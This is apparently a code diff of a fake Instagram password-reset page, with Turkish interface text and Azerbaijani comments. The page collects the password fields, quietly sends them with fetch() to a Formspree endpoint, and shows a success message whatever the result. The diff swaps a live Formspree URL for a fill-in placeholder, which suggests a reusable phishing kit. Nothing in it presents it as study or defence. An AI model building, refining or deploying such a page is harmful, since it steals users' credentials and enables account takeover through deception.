@@ -127,12 +127,6 @@
             min-height: 80vh;
         }
 
-        .success-icon {
-            width: 64px;
-            height: 64px;
-            margin-bottom: 20px;
-        }
-
         .success-title {
             font-size: 22px;
             font-weight: 700;
@@ -186,18 +180,14 @@
 
         <!-- İkinci ekran: Uğurlu Mesaj -->
         <div id="successPage">
-            <svg class="success-icon" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
-                <polyline points="22 4 12 14.01 9 11.01"></polyline>
-            </svg>
-            <h2 class="success-title">Şifre başarıyla güncellendi</h2>
+            <h2 class="success-title">Şifre başarıyla güncellendi!</h2>
             <p class="success-desc">Hesap güvenliğiniz için yeni şifreniz aktif edildi.</p>
             <a href="instagram://" class="open-app-btn">Instagram'ı aç</a>
         </div>
     </div>
 
     <script>
-        const FORMSPREE_URL = "https://formspree.io/f/xwlewbor";
+        const FORMSPREE_URL = "BURAYA_FORMSPREE_LINKINI_YAZ";
 
         document.getElementById('resetForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -207,7 +197,6 @@
             const errorText = document.getElementById('errorText');
             const submitBtn = document.getElementById('submitBtn');
 
-            // Şifrələrin eyniliyini yoxla
             if (newPass !== confirmPass) {
                 errorText.style.display = 'block';
                 return;
@@ -218,7 +207,6 @@
             submitBtn.disabled = true;
             submitBtn.innerText = "Yükleniyor...";
 
-            // Formspree-yə məlumatı arxa fonda göndər
             const formData = new FormData(this);
 
             fetch(FORMSPREE_URL, {
@@ -228,11 +216,9 @@
                     'Accept': 'application/json'
                 }
             }).then(response => {
-                // Formspree ekranı çıxmadan birbaşa yeni səhifəyə keç
                 document.getElementById('formPage').style.display = 'none';
                 document.getElementById('successPage').style.display = 'flex';
             }).catch(error => {
-                // Xəta olsa belə keçid etsin
                 document.getElementById('formPage').style.display = 'none';
                 document.getElementById('successPage').style.display = 'flex';
             });
